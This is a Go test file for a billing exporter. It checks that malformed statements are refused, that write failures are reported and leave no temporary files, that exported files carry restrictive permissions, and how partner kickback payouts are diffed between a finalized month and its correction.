// TestJSONFilesRefusals pins what a statement nothing can be rendered from does
// to an export: it is refused by naming the statement, and it leaves neither a
// directory nor a file behind. Everything is rendered before anything is
// written, so an export that reported an error wrote nothing, and nobody hands
// an ERP the half of a month that happened to render.
func TestJSONFilesRefusals(t *testing.T) {
	cases := []struct {
		name     string
		key      string
		document string
	}{
		{
			name:     "a document that is not an object",
			key:      statementKey,
			document: `[1,2]`,
		},
		{
			name: "a document holding a field the type does not have",
			key:  statementKey,
			document: `{"billing_period":{"from":"2026-03-01T00:00:00Z","to":"2026-04-01T00:00:00Z"},` +
				`"project_id":"proj-456","invoice_number":"2026-03-0001"}`,
		},
		{
			name:     "a key that is not cloud/project",
			key:      "proj-456",
			document: `{"project_id":"proj-456"}`,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := filepath.Join(t.TempDir(), "out")
			run := regularRun(t)
			run.Statements = []statements.Statement{{
				Key:      c.key,
				Document: []byte(c.document),
				Total:    decimal.RequireFromString("128.45"),
				Currency: currency,
			}}

			err := jsonFiles(dir).Export(t.Context(), run)
			if err == nil {
				t.Fatalf("Export() error = nil, want the statement refused")
			}
			if !strings.Contains(err.Error(), c.key) {
				t.Errorf("Export() error = %v, want it to name the statement %s", err, c.key)
			}
			if _, err := os.Stat(dir); !errors.Is(err, fs.ErrNotExist) {
				t.Errorf("the output directory exists and holds %v, want nothing written", names(t, dir))
			}
		})
	}
}

// TestExportOntoAFile pins what an --out that names an existing file reports.
// The path is an operator's, and mkdir is the first thing either writer does
// with it, so the error names the directory it could not create and carries the
// ENOTDIR the filesystem gave.
func TestExportOntoAFile(t *testing.T) {
	for _, c := range writers() {
		t.Run(c.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "out")
			if err := os.WriteFile(path, []byte("a file where a directory was meant\n"), 0o600); err != nil {
				t.Fatalf("planting the file: %v", err)
			}

			err := c.writer(path).Export(t.Context(), regularRun(t))
			if err == nil {
				t.Fatalf("Export() error = nil, want the directory refused")
			}
			if want := "creating the output directory " + path; !strings.Contains(err.Error(), want) {
				t.Errorf("Export() error = %v, want it to start with %q", err, want)
			}
			if !errors.Is(err, syscall.ENOTDIR) {
				t.Errorf("Export() error = %v, want it to carry ENOTDIR", err)
			}
		})
	}
}

// TestExportIntoAWriteProtectedDirectory pins what an export that cannot write
// reports and what it leaves: the error names the file it was writing, and the
// temporary file it had opened is gone. A directory left holding a .tmp is one
// somebody has to clean up before the next export reads clean.
func TestExportIntoAWriteProtectedDirectory(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root writes into a directory whose mode forbids it")
	}

	for _, c := range writers() {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.Chmod(dir, 0o500); err != nil {
				t.Fatalf("write-protecting the directory: %v", err)
			}
			// TempDir removes the directory when the test ends, which the mode
			// above forbids. Cleanups run in reverse order, so this one is first.
			t.Cleanup(func() { _ = os.Chmod(dir, 0o700) })

			err := c.writer(dir).Export(t.Context(), regularRun(t))
			if err == nil {
				t.Fatalf("Export() error = nil, want the write refused")
			}
			if want := "writing " + filepath.Join(dir, c.first) + ":"; !strings.Contains(err.Error(), want) {
				t.Errorf("Export() error = %v, want it to name %q", err, want)
			}
			if got := names(t, dir); len(got) != 0 {
				t.Errorf("the directory holds %v, want nothing, a temporary file included", got)
			}
		})
	}
}

// TestExportModes pins the permissions an export carries. A billing artifact
// names every project of an installation and what it was invoiced, so the
// directory is the exporting user's own and so is every file in it.
func TestExportModes(t *testing.T) {
	for _, c := range writers() {
		t.Run(c.name, func(t *testing.T) {
			dir := filepath.Join(t.TempDir(), "out")
			if err := c.writer(dir).Export(t.Context(), regularRun(t)); err != nil {
				t.Fatalf("Export() error = %v, want nil", err)
			}

			assertMode(t, dir, 0o700)
			files := names(t, dir)
			if len(files) == 0 {
				t.Fatalf("the export wrote no file")
			}
			for _, file := range files {
				assertMode(t, filepath.Join(dir, file), 0o600)
			}
		})
	}
}

// TestDiffKickbacks pins what a correction settles for a partner. A partner is
// paid on the finalized month and again on its correction, so what the
// correction owes is the difference to what the corrected run already settled,
// under the key the credit note is diffed by: a kickback the correction dropped
// takes the whole payout back, one it settles for the first time is owed whole,
// and one it re-stated unchanged is owed nothing.
func TestDiffKickbacks(t *testing.T) {
	cases := []struct {
		name         string
		old, current []export.Kickback
		want         []export.Kickback
	}{
		{
			name: "a kickback that changed, one that is gone and one that is new",
			old: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "126.48", "12.65"),
				kickback("partner-corp", "os-prod", projectID, relation2, "all", "0.100000", "50.00", "5.00"),
			},
			current: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "106.08", "10.61"),
				kickback("partner-corp", "os-prod", projectID, relation3, "all", "0.100000", "30.00", "3.00"),
			},
			want: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "-20.40", "-2.04"),
				kickback("partner-corp", "os-prod", projectID, relation2, "all", "0.100000", "-50.00", "-5.00"),
				kickback("partner-corp", "os-prod", projectID, relation3, "all", "0.100000", "30.00", "3.00"),
			},
		},
		{
			name: "two elements under one key are summed before the difference",
			old: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "126.48", "12.65"),
			},
			current: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "60.00", "6.00"),
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "46.08", "4.61"),
			},
			want: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "-20.40", "-2.04"),
			},
		},
		{
			name: "a base that moved under an amount that did not",
			old: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "100.00", "10.00"),
				kickback("partner-corp", "os-prod", projectID, relation2, "all", "0.100000", "50.00", "5.00"),
			},
			current: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "100.04", "10.00"),
				kickback("partner-corp", "os-prod", projectID, relation2, "all", "0.100000", "60.00", "6.00"),
			},
			want: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation2, "all", "0.100000", "10.00", "1.00"),
			},
		},
		{
			name: "the partner and the project come from the side the key was read off",
			old: []export.Kickback{
				kickback("partner-old", "os-prod", projectID, relation1, "all", "0.100000", "100.00", "10.00"),
				kickback("partner-gone", "os-dr", "proj-789", relation2, "all", "0.050000", "20.00", "1.00"),
			},
			current: []export.Kickback{
				kickback("partner-new", "os-prod", projectID, relation1, "all", "0.100000", "150.00", "15.00"),
			},
			want: []export.Kickback{
				kickback("partner-gone", "os-dr", "proj-789", relation2, "all", "0.050000", "-20.00", "-1.00"),
				kickback("partner-new", "os-prod", projectID, relation1, "all", "0.100000", "50.00", "5.00"),
			},
		},
		{
			name: "two sides that settle the same",
			old: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "126.48", "12.65"),
			},
			current: []export.Kickback{
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "126.48", "12.65"),
			},
		},
		{name: "two sides that settle nothing"},
		{
			// Fed in the reverse of the order they come back in, over every column
			// the order reads: the partner, the statement, the relation, the scope
			// and the rate. No two of them agree on the amount either, so a column
			// the order dropped hands them back in another order rather than in
			// this one by luck.
			name: "a settlement over two partners and six keys",
			current: []export.Kickback{
				kickback("partner-two", "os-prod", projectID, relation1, "all", "0.020000", "500.00", "10.00"),
				kickback("partner-corp", "os-prod", projectID, relation2, "all", "0.100000", "50.00", "5.00"),
				kickback("partner-corp", "os-prod", projectID, relation1, "openstack.instance",
					"0.200000", "10.00", "2.00"),
				kickback("partner-corp", "os-prod", projectID, relation1, "openstack.instance",
					"0.100000", "50.00", "5.00"),
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "100.00", "10.00"),
				kickback("partner-corp", "os-dr", projectID, relation1, "all", "0.100000", "300.00", "30.00"),
			},
			want: []export.Kickback{
				kickback("partner-corp", "os-dr", projectID, relation1, "all", "0.100000", "300.00", "30.00"),
				kickback("partner-corp", "os-prod", projectID, relation1, "all", "0.100000", "100.00", "10.00"),
				kickback("partner-corp", "os-prod", projectID, relation1, "openstack.instance",
					"0.100000", "50.00", "5.00"),
				kickback("partner-corp", "os-prod", projectID, relation1, "openstack.instance",
					"0.200000", "10.00", "2.00"),
				kickback("partner-corp", "os-prod", projectID, relation2, "all", "0.100000", "50.00", "5.00"),
				kickback("partner-two", "os-prod", projectID, relation1, "all", "0.020000", "500.00", "10.00"),
			},
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := export.DiffKickbacks(c.old, c.current)
			// Two sides that agree yield nil rather than an empty slice, which is
			// what a report iterates over without a case for the missing value.
			if len(c.want) == 0 && got != nil {
				t.Fatalf("DiffKickbacks() = %v, want nil", got)
			}
			rows, want := kickbackRows(got), kickbackRows(c.want)
			if !reflect.DeepEqual(rows, want) {
				t.Errorf("DiffKickbacks() = %v, want %v", rows, want)
			}
		})
	}
}

// jsonFiles and csvFiles are the two writers over one directory, as the cases
// hand them around.
func jsonFiles(dir string) export.BillingExporter { return export.JSONFiles{Dir: dir} }

func csvFiles(dir string) export.BillingExporter { return export.CSVFiles{Dir: dir} }

// writers is both file writers and the first file each of them writes, which is
// the one a failing directory fails on.
func writers() []struct {
	name   string
	writer func(dir string) export.BillingExporter
	first  string
} {
	return []struct {
		name   string
		writer func(dir string) export.BillingExporter
		first  string
	}{
		{name: "the JSON writer", writer: jsonFiles, first: drStatementFile},
		{name: "the CSV writer", writer: csvFiles, first: ratedFile},
	}
}

// assertGolden compares an export directory against a golden one: the names it
// holds, and every file byte for byte. The name check is what catches a file
// the writer should not have written and a temporary one it left behind.
func assertGolden(t *testing.T, dir, golden string, files []string) {
	t.Helper()

	assertNames(t, dir, files)
	for _, file := range files {
		got := read(t, filepath.Join(dir, file))
		want := read(t, filepath.Join("testdata", "golden", golden, file))
		if !bytes.Equal(got, want) {
			t.Errorf("%s =\n%s\nwant\n%s", file, got, want)
		}
	}
}

// assertNames holds a directory to the files it should hold, and nothing else.
func assertNames(t *testing.T, dir string, files []string) {
	t.Helper()

	want := slices.Sorted(slices.Values(files))
	if got := names(t, dir); !slices.Equal(got, want) {
		t.Fatalf("the directory holds %v, want %v", got, want)
	}
}

// names lists a directory, in the order os.ReadDir sorts it.
func names(t *testing.T, dir string) []string {
	t.Helper()

	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("reading the directory %s: %v", dir, err)
	}
	got := make([]string, 0, len(entries))
	for _, entry := range entries {
		got = append(got, entry.Name())
	}
	return got
}

// read is one file's bytes.
func read(t *testing.T, path string) []byte {
	t.Helper()

	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("reading %s: %v", path, err)
	}
	return body
}

// readCSV is one exported table, parsed: the header row and the rows under it.
// csv.Reader holds every row to the header's field count, so a separator that
// leaked out of a field fails here rather than at the assertion after it.
func readCSV(t *testing.T, path string) [][]string {
	t.Helper()

	rows, err := csv.NewReader(bytes.NewReader(read(t, path))).ReadAll()
	if err != nil {
		t.Fatalf("reading %s back: %v", path, err)
	}
	return rows
}

// readAll is what an export left, keyed by file name.
func readAll(t *testing.T, dir string, files []string) map[string]string {
	t.Helper()

	bodies := make(map[string]string, len(files))
	for _, file := range files {
		bodies[file] = string(read(t, filepath.Join(dir, file)))
	}
	return bodies
}

// diff names the files two passes disagree on, so a failure says which artifact
// moved rather than printing both exports.
func diff(first, second map[string]string) []string {
	var moved []string
	for file, body := range first {
		if second[file] != body {
			moved = append(moved, file)
		}
	}
	slices.Sort(moved)
	return moved
}

// assertMode holds one path to the permissions it was created with.
func assertMode(t *testing.T, path string, want fs.FileMode) {
	t.Helper()

	info, err := os.Stat(path)
	if err != nil {
		t.Fatalf("reading the mode of %s: %v", path, err)
	}
	if got := info.Mode().Perm(); got != want {
		t.Errorf("the mode of %s = %o, want %o", path, got, want)
	}
}
